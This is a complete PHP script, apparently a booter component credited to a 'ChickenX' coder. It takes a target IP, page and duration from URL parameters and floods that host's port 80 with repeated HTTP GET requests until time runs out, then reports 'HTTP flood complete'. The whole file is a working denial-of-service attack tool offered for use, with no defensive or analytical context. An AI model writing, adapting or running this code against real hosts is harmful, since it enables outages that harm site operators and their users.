<?php
/* 
All credits go to LUKE from ChickenX
Best coder in my eyes - Matin
*/
$ip = $_GET['ip'];
$page = $_GET['page'];
set_time_limit(0);
ignore_user_abort(FALSE);

$exec_time = $_GET['time'];
$time = time();
$max_time = $time+$exec_time;

while(1){
  if(time() > $max_time){
    break;
  }

  $fp = fsockopen("$ip", 80, $errno, $errstr, 30);
  if (!$fp) {
    echo "$errstr ($errno)<br />\n";
  } else {
    $out = "GET $page HTTP/1.1\r\n";
    $out .= "Host: $ip\r\n";
    $out .= "Accept: */*\r\n";
    $out .= "User-Agent: Opera/9.21 (Windows NT 5.1; U; en)\r\n\r\n";
    fwrite($fp, $out);
  }
}
echo "HTTP flood complete after: $exec_time seconds\n";
?>
